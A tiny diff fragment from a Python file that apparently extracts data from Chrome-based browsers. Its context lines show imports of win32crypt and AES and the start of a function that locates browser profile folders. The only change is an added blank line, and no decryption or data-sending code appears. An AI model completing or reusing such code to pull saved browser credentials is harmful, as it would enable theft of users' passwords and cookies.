@@ -6,6 +6,7 @@ import base64
 import win32crypt
 from Cryptodome.Cipher import AES
 
+
 def get_chrome_based_browsers():
     local = os.getenv("LOCALAPPDATA")
     roaming = os.getenv("APPDATA")
